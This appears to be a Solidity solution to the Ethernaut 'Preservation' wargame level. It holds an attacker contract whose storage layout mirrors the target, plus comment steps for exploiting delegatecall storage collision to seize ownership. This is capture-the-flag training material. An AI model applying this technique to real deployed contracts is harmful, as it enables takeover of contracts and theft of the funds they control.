// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 16. PRESERVATION
 * @dev Claim ownership of the instance you are given.
 */

// The storage of the Preservation contract and the one of the LibraryContract are not the same.
// Delegatecall was not a good option here.
// 1. Deploy a new contract wih a modified logic in the setTime function (setting ownership to us for instance)
// 2. Call the setFirstTime function with the address of the new deployed contract.
// 3. Call the setFirstTime function again with any value to change the ownership.

contract Ethernaut_Preservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;

    function setTime(uint _time) public {
        storedTime = _time;
        owner = msg.sender;
    }
}

// 🎉 Level completed! 🎉
